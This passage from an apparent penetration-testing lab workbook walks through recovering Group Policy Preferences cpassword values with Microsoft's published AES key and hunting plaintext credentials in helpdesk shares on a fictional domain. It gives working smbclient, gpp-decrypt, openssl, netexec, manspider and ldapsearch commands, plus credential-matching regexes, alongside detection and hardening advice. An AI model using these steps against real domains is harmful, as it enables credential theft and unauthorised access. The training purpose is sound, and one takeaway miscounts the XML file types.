    B["Restore '=' padding<br/>to length % 4 == 0"]
    C["base64 decode<br/>raw ciphertext bytes"]
    D["AES-256-CBC decrypt<br/>key=4e9906e8...<br/>IV=16x 0x00"]
    E["Strip PKCS7 padding"]
    F["UTF-16 LE decode"]
    G["plaintext password"]

    A --> B --> C --> D --> E --> F --> G

docs.title: Background: GPP, cpassword, and the Public AES Key
docs.text:
Group Policy Preferences (GPP) extended Group Policy in Windows Server 2008 with a way for administrators to deploy local users, scheduled tasks, mapped drives, services, and data sources to client machines. To support credential deployment (such as creating a local administrator account with a fixed password on every workstation), GPP introduced an XML schema that included an encrypted cpassword attribute.

The encryption was AES-256 in CBC mode, with an all-zero IV, and a key that Microsoft published in their own MSDN documentation as a reference for compatibility. The intent was that the encryption obfuscated the password from casual filesystem readers; in practice anyone who read MSDN could decrypt it.

docs.title: The published key
docs.text:
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b

The 32-byte AES-256 key (IV is 16 zero bytes). The plaintext is the password encoded as UTF-16 LE. The ciphertext is base64-encoded with optional trailing = padding stripped.

docs.title: The XML files that may contain cpassword
docs.text:
File Purpose Groups.xml Local user / group deployment Services.xml Service account definition ScheduledTasks.xml Scheduled task credential DataSources.xml ODBC connection string credential Drives.xml Mapped drive credential Printers.xml Printer share credential

Any of these may contain a cpassword="..." attribute. They live under \\<domain>\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\<Type>\.

docs.title: The patch and what it did not do
docs.text: MS14-025 removed the GUI affordances that let administrators create new cpassword entries through gpedit.msc. Existing entries continue to work because client-side processing of GPP is unchanged. Microsoft's official guidance is to manually delete every cpassword-bearing XML from SYSVOL after rotating the leaked passwords. Most organizations did the rotation; very few did the deletion. The artifact is consequently one of the most reliable findings in any internal pentest of an AD older than ~2014.

docs.title: gpp-decrypt
docs.text:
A Ruby one-liner shipped on Kali that does AES-256 CBC decryption with the published key.

gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'

Output is the plaintext password.

docs.title: smbclient mass-download of SYSVOL
docs.text:
smbclient //corp-dc01/SYSVOL -U "CORP\j.chen%Welcome2026#" \
  -c "recurse on; prompt off; mget *"

Downloads the full SYSVOL tree to your current working directory.

docs.title: grep + find for SYSVOL inspection
docs.text:
grep -rE 'cpassword="[^"]+"' SYSVOL/

Returns every line containing a cpassword attribute across the dump.

docs.title: Manual openssl decryption (if gpp-decrypt is missing)
docs.text:
echo -n '<base64-cipher>=' | openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8

The = padding restoration matters. GPP strips trailing =; openssl needs them. Pad the base64 string until its length is a multiple of 4.

docs.title: Step 1: Confirm Your Scope Token
docs.text:
The platform injects your scope token as OCR_SCOPE_TOKEN. Workbook commands reference ${OCR_SCOPE_TOKEN} directly so you can paste them as-is. Make sure the variable is set first.

Kali - Confirm scope token

echo "$OCR_SCOPE_TOKEN"

Should print a 4-character lowercase string (e.g. j001). If empty, export OCR_SCOPE_TOKEN=<your_token> from the lab dashboard banner.

docs.title: Step 2: Mirror SYSVOL Locally
docs.text:
SYSVOL is the replicated GPO/script share served by every DC. Reading it is normal: every domain-joined machine pulls SYSVOL on every Group Policy refresh, so SYSVOL reads do not get logged or alerted on by default. Mirror the entire tree to local disk in one shot, then grep at leisure.

Kali - Pull the entire SYSVOL share to disk

mkdir -p ~/work/adpt-2-02 && cd ~/work/adpt-2-02
smbclient //corp-dc01/SYSVOL -U "CORP\j.chen%Welcome2026#" \
  -c "recurse on; prompt off; mget *"

What each piece does:

  • mkdir -p ~/work/adpt-2-02 && cd ... create a working directory and switch to it. mkdir -p does not error if it already exists. && runs the second command only if the first succeeded.
  • smbclient //corp-dc01/SYSVOL UNC path to the SYSVOL share. SYSVOL is a default share on every DC; j.chen (any authenticated domain user) has read access by design.
  • -U "CORP\j.chen%Welcome2026#" credential bundle.
  • -c "recurse on; prompt off; mget *" non-interactive command list:
    • recurse on recurse into subdirectories on subsequent operations.
    • prompt off do not ask for confirmation per-file (without this, mget prompts before each download).
    • mget * download every file in the current directory and (with recurse on) every subdirectory.

The download takes seconds. SYSVOL on a freshly built domain is a few MB; on a real production domain expect tens to hundreds of MB.

docs.title: Step 3: Hunt for cpassword
docs.text:
The whole tree is now in your local CWD. Grep recursively for the cpassword= attribute. Note: this is one of those rare cases where grep on local files is faster + safer than grep over SMB (no rate limit, no audit footprint after the initial mirror).

Kali - Find every cpassword attribute

grep -rE 'cpassword="[^"]+"' . | head -20

What each option does:

Flag Effect -r Recurse into subdirectories. -E Extended regex (so [^"]+ works without escaping). 'cpassword="[^"]+"' Match the literal cpassword="...something not a quote...". The [^"]+ greedy-matches up to the closing quote. . Search starting from current directory. \| head -20 Cap at 20 matches; production SYSVOLs sometimes have many.

On Nordport's SYSVOL you will find a Groups.xml under the Default Domain Policy GUID ({31B2F340-016D-11D2-945F-00C04FB984F9}) containing one User entry per scope token. Each User node has a name="svc_gpp_<token>" and a cpassword="...".

docs.title: Step 4: Filter to Your Token
docs.text:
Each student has a per-token User entry in the same Groups.xml. Extract just yours.

Kali - Pull just your User entry

grep -A1 -E "name=\"svc_gpp_${OCR_SCOPE_TOKEN}\"" \
  ./corp.nordport.local/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/Machine/Preferences/Groups/Groups.xml

What each piece does:

  • -A1 print 1 line of context AFTER each match. The XML is structured so the <Properties cpassword="..."> line follows the <User name="..."> line.
  • -E extended regex; needed for the escaped double-quote class.
  • The XML path: SYSVOL contents under each domain are organized as <domain>/Policies/<GPO-GUID>/Machine/Preferences/<type>/<type>.xml. The Default Domain Policy GUID is the constant {31B2F340-016D-11D2-945F-00C04FB984F9} (the same on every domain).
  • The braces in the path need backslash-escaping in bash because {...} is brace expansion syntax.

The output shows the <User ...> line and the next line containing the Properties element with the cpassword. Extract the cpassword value.

A more surgical extract that returns ONLY the cpassword string:

Kali - One-liner to get just your cpassword string

XML=./corp.nordport.local/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/Machine/Preferences/Groups/Groups.xml
grep -E "userName=\"svc_gpp_${OCR_SCOPE_TOKEN}\"" "$XML" \
  | grep -oE 'cpassword="[^"]+"' | head -1

What each piece does:

  • XML=... shell variable holding the file path. Saves typing the long path twice.
  • First grep -E "userName=...\"$OCR_SCOPE_TOKEN\"" filter to lines mentioning your specific user.
  • Pipe to grep -oE 'cpassword="[^"]+"':
    • -o only print the matched substring.
    • -E extended regex.
    • The pattern matches cpassword="..." literal.
  • | head -1 take only the first match (defensive; should be exactly one).

docs.title: Step 5: Decrypt
docs.text:
gpp-decrypt is a small Ruby tool shipped on Kali. It hardcodes the published Microsoft AES-256 key and the all-zero IV, so it requires no arguments other than the cpassword.

Kali - Decrypt with gpp-decrypt

gpp-decrypt '<paste your cpassword value here>'

What this does:

  • Takes the base64-encoded ciphertext as the only argument.
  • Restores the trailing = padding that GPP strips.
  • AES-256-CBC decrypts using the published key (4e9906e8fcb66cc9...).
  • Strips PKCS7 padding from the plaintext.
  • Decodes the resulting bytes as UTF-16 LE (Windows passwords are stored UTF-16 LE internally).

The output is the plaintext password for svc_gpp_<token>. If the cpassword has unusual characters or the tool errors, fall back to manual openssl: echo -n '<cpassword>=' | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8.

docs.title: Step 6: Authenticate as the Recovered Account
docs.text:
Confirm the cracked credential works against the DC. Validating before using it for the actual share read tells you the decryption worked AND the account is enabled.

Kali - Validate svc_gpp_ 

netexec smb corp-dc01 -u "svc_gpp_${OCR_SCOPE_TOKEN}" -p '<recovered password>' \
  -d corp.nordport.local

Same netexec auth check pattern from earlier exercises: [+] means success, [-] with STATUS_LOGON_FAILURE means the password is wrong (probably a copy-paste issue with the cpassword), [-] with STATUS_ACCOUNT_DISABLED means the account exists but is disabled.

docs.title: Step 7: Read the Token-Scoped Flag
docs.text:
The recovered svc_gpp account has read access to a per-token directory under the \\corp-dc01\GPPFlags\ share. The directory ACL grants read ONLY to the matching svc_gpp account (and Domain Admins / SYSTEM); other students' svc_gpp accounts cannot read your directory.

Kali - Pull the flag file from your scoped directory

smbclient "//corp-dc01/GPPFlags" \
  -U "CORP\\svc_gpp_${OCR_SCOPE_TOKEN}%<recovered password>" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt

What each piece does:

  • //corp-dc01/GPPFlags UNC path to the per-exercise share (created by setup-adpt-dc.ps1).
  • -U "CORP\\svc_gpp_${OCR_SCOPE_TOKEN}%..." authenticate as the recovered account, NOT as j.chen. The double-backslash inside double-quotes escapes to a single backslash for smbclient's parser.
  • -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt" non-interactive: cd into the per-token subdirectory, then download the flag file.
  • cat FLAG.txt print the contents.

The file holds a flag string in the form OCR{...}. Submit it on the platform.

docs.title: Blue Team Perspective
docs.text:
Reading SYSVOL is normal client behavior; every domain-joined computer reads it on every Group Policy refresh. The detection signals therefore have to be more nuanced than "file was read".

Activity Event ID Where it fires SYSVOL share access from Kali 5140 (network share access) DC Security log Recursive directory traversal 4663 burst DC Security log (if object access auditing on SYSVOL) GPP XML containing cpassword Custom SIEM rule on file content File integrity monitor Service account login from new IP 4624 logon type 3 Target server Security log

What SOCs typically catch

Few defenders monitor reads on SYSVOL because GPO refreshes generate baseline noise. The detection that does work is on the use of the recovered credential: a service account never logs on interactively, and any 4624 logon for svc_gpp_* outside its expected hosts is a strong indicator. File integrity monitoring on SYSVOL with a regex match for cpassword=" flags the artifact for the blue team's quarterly hunt list.

docs.title: Hardening Note
docs.text:
The remediation order matters: rotate first, then delete. Deleting the XML before rotating leaves every machine that consumed the policy with the old password still active.

GPP cpassword remediation steps

  • Rotate the password of every account referenced in a GPP XML on every host that may have applied the policy.
  • Edit each offending GPO via GPMC and remove the GPP entry through the UI; verify the resulting XML no longer contains cpassword.
  • Run dfsrdiag replicationstate on every DC to confirm the deletion replicated.
  • Migrate local-admin password management to LAPS / Windows LAPS; service-account use to gMSAs.
  • Add a SIEM detection: file integrity monitor on SYSVOL\**\Preferences\**\*.xml matching cpassword=".
  • Audit older backups; expired credentials in restored snapshots are still useful to an attacker who can read the snapshot.

docs.title: Record Your Findings
docs.text:
GPP file with cpassword:

(path under SYSVOL)

Recovered password for svc_gpp_: 

(do not paste this in a real engagement report; treat as live credential)

Flag:

(OCR{...})

docs.title: Analysis Questions
docs.text:
1. Microsoft published the GPP AES key in MSDN. Why? And what does that decision tell you about the company's threat model at the time?

Reveal Answer

Microsoft published the key as part of the GPP reference documentation so third-party tooling could read and write the same XML format. The threat model assumed the security boundary lived above the SYSVOL filesystem: only authenticated domain users could read SYSVOL, and authenticated domain users were considered trusted enough to know local admin passwords. That assumption broke the moment any authenticated domain user was untrusted (compromised account, contractor, intern). The episode is a textbook case of confusing "obfuscation" with "encryption." Real encryption requires that knowing the algorithm and ciphertext does not yield the plaintext without a secret. Publishing the key inverted that. Modern Group Policy alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret out of SYSVOL entirely.

2. SYSVOL replicates between DCs. If a defender deletes the offending Groups.xml on one DC, what could go wrong, and how should the deletion be done correctly?

Reveal Answer

SYSVOL replicates via DFS-R (or the older FRS on legacy domains). Deleting a file on one DC normally propagates the deletion to every other DC. Two failure modes appear: (a) DFS-R replication backlogs hide deletions for hours or days during which the file is still readable on lagging DCs; (b) some operators delete the GPP XML on the file system but not the corresponding GPO container, leaving an orphaned policy that GPMC reports as broken. The correct procedure is to use Group Policy Management Console to edit the GPO and remove the GPP entry through the UI (which writes a clean XML without the cpassword and increments the GPO version number), then verify replication on every DC with repadmin /showrepl and dfsrdiag replicationstate. After that, rotate the leaked password on every machine that may have used it. Deletion alone is not sufficient because backups and snapshots may still contain the original.

3. The published key is for AES-256-CBC with a zero IV and UTF-16LE plaintext. Walk through the decryption math at the byte level.

Reveal Answer
  1. Take the base64 ciphertext, restore trailing = padding to a length that is a multiple of 4, base64-decode to raw bytes. 2. Initialize an AES-256-CBC decryptor with the 32-byte key (4e9906...) and a 16-byte zero IV. 3. Decrypt the ciphertext, yielding plaintext bytes plus PKCS7 padding. 4. Strip PKCS7 padding (the last byte tells you how many padding bytes to strip; verify each padding byte equals that count). 5. Decode the remaining bytes as UTF-16 LE (every printable ASCII character takes two bytes, with the high byte being zero). 6. The resulting string is the plaintext password. The reason UTF-16 LE is used is that Windows internally stores user passwords as UTF-16 LE Unicode strings; GPP simply round-trips the same encoding through AES.

docs.title: Key Takeaways
docs.text:
• The GPP AES key is public; any cpassword in any reachable SYSVOL is plaintext to anyone who can read the file.
  • Five XML schemas may contain cpassword: Groups, Services, ScheduledTasks, DataSources, Drives, Printers. Search them all.
  • SYSVOL is readable by any authenticated domain user, so the bar for triggering this finding is low.
  • Deletion of cpassword entries is not enough; rotate every leaked credential on every machine that used it.
  • Modern alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret off SYSVOL entirely.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover the entire find-decrypt-use loop. Pin this card; SYSVOL is the cheapest finding in any internal pentest of a long-lived AD.

Goal Command Mirror SYSVOL locally smbclient //<dc>/SYSVOL -U "<DOMAIN>\<user>%<pw>" -c "recurse on; prompt off; mget *" Hunt cpassword strings grep -rE 'cpassword="[^"]+"' . Decrypt a cpassword gpp-decrypt '<base64-cipher>' Validate the recovered cred netexec smb <dc> -u <recovered-user> -p '<plain>' -d <domain>

docs.title: Spaced Repetition
docs.text:
Card 1: GPP cpassword Decryption

Q: What command decrypts a GPP cpassword string j1Uyj3Vx... on Kali, and what is the underlying algorithm?

Answer 
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'

Algorithm: AES-256-CBC with the published 32-byte key starting 4e9906e8fcb66cc9..., 16-byte zero IV, plaintext encoded as UTF-16 LE, ciphertext base64 with stripped trailing padding.

Card 2: cpassword File Locations

Q: Name five XML file types in SYSVOL that may contain a cpassword attribute.

Answer

Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml. All under \\<domain>\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\<Type>\. Always grep for cpassword=" recursively rather than guessing which file type the operator used.

Card 3: SYSVOL Mirror in One Command

Q: Write the smbclient command to recursively download all of SYSVOL from corp-dc01 as j.smith / Pass#.

Answer 
smbclient //corp-dc01/SYSVOL -U "CORP\j.smith%Pass#" \
  -c "recurse on; prompt off; mget *"

Run from an empty working directory; the entire SYSVOL tree mirrors below your CWD. SYSVOL is typically only a few MB on a small domain.

Card 4: MS14-025

Q: What did MS14-025 do, and what did it explicitly NOT do?

Answer

It removed the GUI affordances that let administrators create new GPP cpassword entries through gpedit.msc. It did NOT delete or rewrite existing entries already in SYSVOL, did NOT rotate any leaked passwords, and did NOT change client-side GPP processing (so old entries still apply policy). The artifact survives indefinitely until an administrator manually removes the entries and rotates the passwords.

Card 5: openssl Fallback Decryption

Q: If gpp-decrypt is missing, write the openssl command to decrypt a GPP cpassword.

Answer 
echo -n '<base64+padding>' | openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8

Restore the = padding to a multiple of 4 first. The iconv step converts the UTF-16 LE plaintext back to UTF-8 for terminal display.

docs.title: Before You Begin
docs.text:
Helpdesk teams write to themselves. They drop notes onto shares to coordinate handoffs, pasted screenshots when a ticket is escalating, runbooks they wrote at 2 AM and never edited again. SOC tooling rarely scans these files. Defenders rarely audit them. Pentesters find a credential in one of them on most engagements.

Exercise 2.3 gives you a low-privileged credential, points you at a directory full of helpdesk archive notes, and asks you to find the one note that contains a working password. The recovered account stores your flag in extensionAttribute1.

Tools required: netexec, smbclient, manspider, ldapsearch. All are pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "Engineering put a file called vendor_setup_notes.txt on a read-everyone share three years ago. Marketing put a screenshot of an email on the IT share when their VPN was broken. Helpdesk put a notes file in their archive folder when they were rotating a contractor password over the weekend and never came back to clean it up. Hunt."

The contractor's account is t.archer_<token>. The flag is in their extensionAttribute1.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Enumerate the IT-Tools share on corp-dc01
  • Spider the helpdesk-archive directory and identify your per-token note
  • Recover the credential for t.archer_<token>
  • Authenticate as that account and read its extensionAttribute1
  • Submit the flag

docs.title: Hunt Decision Tree
docs.text:
The flowchart below is the order of operations on every share-credential hunt. Filename match is faster but only works when you already know what you are looking for; content scanning catches the rest.

flowchart TD
    Start["IT-Tools share<br/>read access confirmed"]
    A{"Do you know<br/>filename pattern?"}
    B["smbclient ls *<token>*<br/>then get the match"]
    C["manspider --content<br/>against credential regex"]
    D["File found"]
    E["Extract username + password<br/>(read the file)"]
    F["Validate via netexec smb"]
    G{"Auth succeeds?"}
    H["Use account, read flag attribute"]
    I["Try other matches /<br/>broaden regex"]

    Start --> A
    A -- "yes" --> B --> D
    A -- "no" --> C --> D
    D --> E --> F --> G
    G -- "yes" --> H
    G -- "no" --> I

docs.title: Common Credential Regex Patterns
docs.text:
The patterns below catch the formats you will find on shared drives in the wild. Combine them with | in the manspider --content argument for a single sweep.

Regex Catches password\s*[:=]\s*\S+ password: Foo# or password=Foo# pwd\s*[:=]\s*\S+ pwd: Foo# cpassword="[^"]+" GPP cpassword leftover connectionString= ODBC / ADO strings (often plaintext) BEGIN OPENSSH PRIVATE KEY SSH private keys aws_secret_access_key\s*= AWS programmatic keys client_secret"?\s*[:=] OAuth client secrets Authorization:\s*Basic\s+[A-Za-z0-9+/=]+ Cached HTTP Basic-auth tokens

docs.title: Background: Where Helpdesk Credentials Leak
docs.text:
The pattern is consistent across organizations. Helpdesk staff need a place to coordinate work that is more durable than chat (chats roll off, are not retroactively searchable, and do not survive across teams) and lower-friction than a ticketing system (ticket fields are rigid, comments hide easily). The pragmatic answer is a shared drive: \\corp-dc01\IT-Tools\, \\srv-helpdesk\Notes\, \\dc01\Helpdesk$\. Each note is a small text file with a date, a title, and a few lines of content. Most are harmless: runbooks, contact lists, patch windows. Some contain credentials.

The credential leak shapes:

  1. Inline plaintext -- "Username: contractor1 / Password: TempVPN2024#"
  2. Email forwarded for context; the original email had a temporary password the user is supposed to change
  3. Embedded in a script -- net use \\srv\share /user:contractor1 TempVPN2024#
  4. Connection string in an INI -- Data Source=...;User Id=svc_app;Password=...
  5. Pasted from a password manager -- "Vault export 2024-08, do not delete" with the export below

The defender's countermeasure is content scanning the share with the same tools attackers use. manspider against your own shares quarterly, with a regex covering the patterns above, catches most of these leaks before an attacker does.

docs.title: manspider for content scanning
docs.text:
manspider <host> -u <user> -p <pass> -d <domain> --content "<regex>" -e <extensions>

Useful patterns:

Pattern Catches password\s*[:=] Plaintext "password: ..." or "password=..." cpassword GPP cpassword leftover connectionString= ODBC / ADO connection strings BEGIN OPENSSH PRIVATE KEY SSH keys client_secret OAuth client secrets aws_secret_access_key AWS credentials

Multiple patterns with |: --content "password\s*=|cpassword|client_secret".

docs.title: smbclient targeted listing
docs.text:
smbclient //corp-dc01/IT-Tools -U "CORP\j.chen%Welcome2026#" \
  -c "cd helpdesk-archive; ls"

Lists one specific directory without a full mirror download.

docs.title: ldapsearch for extensionAttribute reads
docs.text:
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\t.archer_<token>" -w '<password>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=t.archer_<token>)" extensionAttribute1

extensionAttribute1 through extensionAttribute15 are free-form attributes Microsoft reserves for HRIS sync, custom apps, and operator notes. They are readable by Authenticated Users by default. They show up nowhere in the GUI, which is exactly why operators use them to hide things.

docs.title: Step 1: Confirm Token
docs.text:
Every Kali user in this lab gets a 4-character scope token injected at session start as the environment variable OCR_SCOPE_TOKEN. The seeded helpdesk note, the contractor account, and the flag attribute are all suffixed with that token. Reading it once at the start of a chapter prevents the most common per-token mistake: typing your neighbor's token by accident.

Kali - Confirm scope token

echo "$OCR_SCOPE_TOKEN"

Output is a 4-character alphanumeric string (for example j001 or m4tk). Save it visually; every command in this chapter will substitute it for <token>.

docs.title: Step 2: Enumerate Shares on corp-dc01
docs.text:
Before content-scanning anything you need a list of shares the credential can touch. netexec --shares enumerates every share on the host, attempts an authenticated tree connect against each, and prints the access level it observed.

Kali - Share inventory

netexec smb corp-dc01 -u j.chen -p 'Welcome2026#' -d corp.nordport.local --shares
Flag Effect smb Targets the SMB protocol. corp-dc01 Hostname of the file server (resolves through the DC). -u, -p, -d Username, password, domain. --shares After auth, walks every share and prints READ, WRITE, or no access.

Look for IT-Tools in the listing with READ access. Any share j.chen has only NO ACCESS to is irrelevant; do not waste time on it. The other shares with READ are not part of this exercise but are worth noting for your own report.

docs.title: Step 3: Browse the Helpdesk Archive
docs.text:
The full share has hundreds of files; you only care about one folder. smbclient -c runs a single semicolon-separated command list against the server, which is faster than the interactive shell when you already know where to look.

Kali - List helpdesk-archive

smbclient //corp-dc01/IT-Tools -U "CORP\j.chen%Welcome2026#" \
  -c "cd helpdesk-archive; ls"
Flag Effect //corp-dc01/IT-Tools UNC path with forward slashes (Linux convention). -U "DOMAIN\user%password" Inline credential. The % separator avoids a prompt. -c "cd ...; ls" Run two commands in one connection then exit.

The listing shows ~25 per-token note files plus ~25 decoys. Your note follows the pattern vpn_helpdesk_handoff_<token>.txt. Other students' notes are visible but not readable (DACL'd to deny Authenticated Users).

docs.title: Step 4: Filter to Your Token
docs.text:
Listing 50 files when only one matters wastes time. SMB's ls accepts glob patterns just like a shell, so a wildcard around your token narrows the result instantly.

Kali - List only your token's notes

smbclient //corp-dc01/IT-Tools -U "CORP\j.chen%Welcome2026#" \
  -c "cd helpdesk-archive; ls *${OCR_SCOPE_TOKEN}*"

Exactly one file matches. Pull it next.

Kali - Download your note

mkdir -p ~/work/adpt-2-03 && cd ~/work/adpt-2-03
smbclient //corp-dc01/IT-Tools -U "CORP\j.chen%Welcome2026#" \
  -c "cd helpdesk-archive; get vpn_helpdesk_handoff_${OCR_SCOPE_TOKEN}.txt"
cat vpn_helpdesk_handoff_${OCR_SCOPE_TOKEN}.txt
Flag Effect mkdir -p ... && cd ... Create a per-exercise working directory so artifacts do not pollute your home. get <remote_file> Pull the file into the current local directory. cat ... Display the contents locally.

The file shows the username t.archer_<token> and a plaintext password. Real-world equivalents include "vendor turnover notes," "vpn temp creds," "contractor runbooks." All look mundane; all leak secrets.

docs.title: Step 5: Validate the Credential
docs.text:
Before chaining any further commands on the recovered account, confirm the credential actually works. netexec smb against the DC is the cheapest probe: a single SMB Negotiate + SessionSetup and you know whether the password is right.

Kali - Validate t.archer_ 

netexec smb corp-dc01 -u "t.archer_${OCR_SCOPE_TOKEN}" \
  -p '<password from the note>' -d corp.nordport.local

Look for [+] (auth success) at the end of the line. [-] with STATUS_LOGON_FAILURE means the password in the note is wrong; reread the note (line breaks, trailing characters, copy-paste artifacts).

docs.title: Step 6: Read extensionAttribute1
docs.text:
Once you have a working credential, query LDAP for the contractor user object and request the single attribute that holds the flag. Selecting attributes by name (rather than *) keeps the response small and the action narrow.

Kali - Read extensionAttribute1 over LDAP

ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\t.archer_${OCR_SCOPE_TOKEN}" -w '<password>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=t.archer_${OCR_SCOPE_TOKEN})" extensionAttribute1
Flag Effect -x Simple bind (no SASL). Required for username+password auth. -LLL LDIF output without comments or version line. Cleaner to grep. -H ldap://corp-dc01 LDAP URI; ldap:// is plaintext on 389. -D "CORP\user" Bind DN (down-level format works for AD). -w '<pw>' Password inline. Use -W to be prompted instead. -b "<base_dn>" Search base; the domain root for a domain-wide hunt. (sAMAccountName=...) Filter selecting only the contractor object. extensionAttribute1 Trailing attribute list; only this attribute is returned.

The flag appears as the value of extensionAttribute1. Submit it to the platform.

docs.title: Step 7: Bonus - Find the File via Content Scan
docs.text:
In a real engagement you would not know the contractor's username up front. The realistic discovery path is to content-scan every readable share for credential-shaped strings and triage the hits. The bonus step below practices that workflow against your own per-token note.

Kali - Content scan for your token

manspider corp-dc01 -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  --content "t.archer_${OCR_SCOPE_TOKEN}" -e txt,csv,docx,ini
Flag Effect <host> Target SMB server. --content "<regex>" Server-side fetch then local regex scan; multiple patterns join with |. -e txt,csv,docx,ini Restrict to the listed extensions; no point reading binaries.

Manspider returns the same path Step 4 found. In a real engagement, swap the regex for a generic credential pattern (password\s*[:=]|cpassword|client_secret) and triage the hits.

Common gotchas

  • Unquoted token expansion: shells will expand *${OCR_SCOPE_TOKEN}* if the variable is empty. Always echo $OCR_SCOPE_TOKEN first.
  • Backslash escaping in -U: bash interprets \ so quote the credential string. "CORP\user%pass" works; CORP\user%pass does not.
  • manspider verbose output: by default it prints every file it considered. Add -q to suppress non-matching entries.
  • DACL'd notes: trying to read another student's note will fail silently with NT_STATUS_ACCESS_DENIED; that is the lab's per-token isolation, not a tool bug.

docs.title: Blue Team Perspective
docs.text:
The first detectable signal is not the read but the use. A contractor account that suddenly authenticates from a workstation IP it has never touched before is the easiest catch in this attack chain.

Activity Event ID Where it fires File read on IT-Tools share 5145 (detailed share access) File server Security log Credential write to share 4663 + file integrity monitor File server Security log New auth from contractor account 4624 logon type 3 from new IP DC Security log LDAP read of extensionAttribute1 4662 with attribute access audit DC Security log

What a tuned SOC catches

Most environments do not catch the file read; baseline noise on IT-Tools is too high. They do catch the unusual 4624 logon type 3 for t.archer_* from a non-helpdesk subnet, especially when paired with no recent 4768 (TGT issuance) for that user. Identity-driven detection beats file-content monitoring on this attack class.

docs.title: Hardening Note
docs.text:
You cannot stop helpdesk teams from sharing notes; you can stop them from sharing credentials in those notes. The list below is the realistic checklist.

Helpful-share hardening

  • Rotate every credential found by an internal manspider sweep; do not just delete the file.
  • Replace shared text-file workflows with a wiki that has search and revision history.
  • Require credentials to be stored in a password manager and only referenced by entry name in shared notes.
  • Run manspider --content "password\s*[:=]|cpassword|client_secret" quarterly against every read-everyone share; route hits to a triage queue.
  • DACL extensionAttribute1 through extensionAttribute15 to deny Authenticated Users read where they are not used.
  • Build a SIEM detection: contractor-class accounts logging in from a host outside the helpdesk subnet.

docs.title: Record Your Findings
docs.text:
Helpful file path:

\\corp-dc01\IT-Tools\helpdesk-archive\vpn_helpdesk_handoff_<token>.txt

Recovered credential:

t.archer_<token> / <password>

Flag (extensionAttribute1):

(OCR{...})

docs.title: Analysis Questions
docs.text:
1. Helpdesk staff frequently use SMB shares for notes because the alternatives are worse. From a defender's perspective, what is the right trade-off between auditability and friction?

Reveal Answer

The realistic alternatives are: a properly indexed wiki (high auditability, moderate friction), a ticketing system (high auditability, high friction for short notes), or chat (low auditability, low friction, but searchable history is per-tool). A read/write SMB share is the lowest friction tool helpdesk staff can use, which is precisely why credentials end up there. The right defender response is not to ban the share but to combine: (a) make the wiki frictionless enough to compete with the share, (b) auto-scan all writeable shares weekly with manspider against a credential regex, (c) require credentials to be stored in a password manager and only referenced by ID in any document. Banning the share without giving staff a competitive alternative produces the same notes in WhatsApp and personal Google Drives, which is worse.

2. extensionAttribute1 through extensionAttribute15 are free-form fields. Why were they introduced, and what defensive controls limit their abuse as covert storage?

Reveal Answer

Microsoft introduced extensionAttribute1 through 15 (and mailNickname, proxyAddresses) for Exchange to extend user objects with mailbox-related metadata without each Exchange version needing schema modifications. They became general-purpose because no schema authority restricted them; HRIS sync products, custom HR apps, asset trackers, and ad-hoc admin scripts all use them. Defensive controls: (a) DACL the attributes to deny Authenticated Users read for the attributes you do not want broadly visible; AD ACLs are per-attribute; (b) flag attribute writes in audit policy (event 4738 with the right attributes) and treat any write outside business hours as suspicious; (c) periodic audits looking for non-empty values on accounts that should not have them. The attributes were not designed for sensitive data and any operator using them as covert storage is making the defender's job easier rather than harder.

3. The credential leak in this exercise is plaintext, but the same finding pattern with hashes (NTDS dumps, LSA secret dumps in scripts) is common. What is the practical difference for an attacker between finding a plaintext password and finding a hash?

Reveal Answer

A plaintext password is immediately reusable everywhere: SMB, LDAP, RDP, web SSO, third-party SaaS that federates against AD, password reuse on personal services. A hash is only directly reusable in protocols that accept the hash form: pass-the-hash works against SMB, WMI, WinRM, MSSQL with NTLM. Pass-the-ticket works after exchanging the hash for a Kerberos ticket. RDP requires Restricted Admin mode (and a registry tweak on the target). Web SSO usually requires the plaintext to compute the auth flow. So a hash is more constrained but still extremely valuable; an attacker often cracks the hash offline in parallel and uses pass-the-hash for the lateral movement, treating the cracked plaintext as a bonus.

docs.title: Key Takeaways
docs.text:
• Helpdesk archive shares are the single highest-yield credential leak surface in a typical AD environment.
  • manspider --content "<regex>" content-scans shares at scale; defenders should run the same scan periodically.
  • extensionAttribute1 through extensionAttribute15 are readable by any authenticated user by default.
  • A plaintext credential beats a hash in flexibility but the credential leak pattern is the same in either form.
  • Per-token scoping in this exercise teaches you the workflow on your file; in a real engagement no scope token bounds the search.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below are the share-credential hunt loop. Use the credential-regex patterns from the table at the top of this chapter.

